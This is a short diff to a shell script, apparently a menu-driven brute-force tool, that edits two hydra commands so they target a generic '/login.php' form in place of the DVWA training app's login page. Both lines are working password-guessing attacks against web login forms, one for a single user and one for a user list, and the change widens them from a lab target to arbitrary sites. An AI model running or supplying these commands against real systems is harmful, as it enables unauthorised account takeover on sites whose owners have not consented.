@@ -237,7 +237,7 @@ echo ""
 echo -e "\e[33m -------------------------------------------------------- \e[0m"
 echo ""
 
-hydra $ip -l $user -P $passwd -vV http-form-post "/dvwa/login.php:username=$user&password=^PASS^&Login=Login:Login failed" -t 4 -I
+hydra $ip -l $user -P $passwd -vV http-form-post "/login.php:username=$user&password=^PASS^&Login=Login:Login failed" -t 4 -I
 
    read
    return 0
@@ -271,7 +271,7 @@ echo ""
 echo -e "\e[33m -------------------------------------------------------- \e[0m"
 echo ""
 
-hydra $ip -L $users -P $passwd -vV http-form-post "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" -t 4 -I
+hydra $ip -L $users -P $passwd -vV http-form-post "/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" -t 4 -I
 
    read
    return 0
